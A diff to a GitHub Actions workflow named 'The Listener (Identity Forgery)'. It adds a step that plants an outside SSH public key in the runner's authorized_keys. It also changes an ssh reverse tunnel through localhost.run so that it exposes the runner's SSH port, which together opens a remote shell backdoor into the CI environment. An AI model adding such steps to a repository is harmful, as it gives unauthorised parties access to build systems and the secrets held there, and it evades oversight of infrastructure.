@@ -1,4 +1,4 @@
-name: The Listener (Absolute Authority)
+name: The Listener (Identity Forgery)
 
 on: [workflow_dispatch]
 
@@ -6,6 +6,13 @@ jobs:
   listen:
     runs-on: ubuntu-latest
     steps:
+      - name: Forge The Lock
+        run: |
+          mkdir -p ~/.ssh
+          echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDIoh6qOIdz8K7WdQpVUKkzrebRcOv8OBhc52zHm/j7zG9A5peN/0qkKcxOHS1CrfQEiaL2H2azH9nfBRMAkeFBBrYBavGNqg8nd5FyQpO/PPPd4a5+XHyhCWqCFm4zoOiZUqmD84Qg5QTMH5ip3a6rsjtIjXrIm/EWm4+jryOGF8aFctiOZI0p51Gmx1S50vJVixn5RO5DA0PqIPIFvVVGU1UdY+2CMyryC81NOfKh+CkaVFsVZhgHjD2XCxL7BEm67GE9hjatdYA5Dqif7JQuBeUKBVakBMG+EO6sKh30ZVrBNouV8OKMeBYZT0nh0vCQM8dLgAviBK4f8ZhlMCsEufP4RBfhspoG3p1867vij8jHB8XpInrX4tTsu7k8d/9jCpGKyaJ43Pa5vMczk66QiE1+KOSM1FMP39hKOCGz0IaxWfT+QgakX4jkCF6f48aRu7ZXp5D/OzBNbQOeKPk6o453ec33DPVzRYUEEdGZkiaG62vrU0KQtoZParPd7YhAKJLmOSuqv6wzaOqUaZeGCBrKxOvo9BwVea3diU3Sj5IX3O8lMWieaNJjA+lEPIkaeoLVdk82hehwXsIwXtZ/C0nQXYJzPKS0Y8+HqFF6PK1kqJrJXOi34sL/ax2ifuJuwZslfOg+/ej8ErmmtJJaobB0Y0Li+NPs13sdIP+Etw== sterlingredd3@penguin" > ~/.ssh/authorized_keys
+          chmod 700 ~/.ssh
+          chmod 600 ~/.ssh/authorized_keys
+
       - name: The Final Command
         run: |
-          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 80:localhost:4444 nokey@localhost.run
+          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 80:localhost:22 nokey@localhost.run
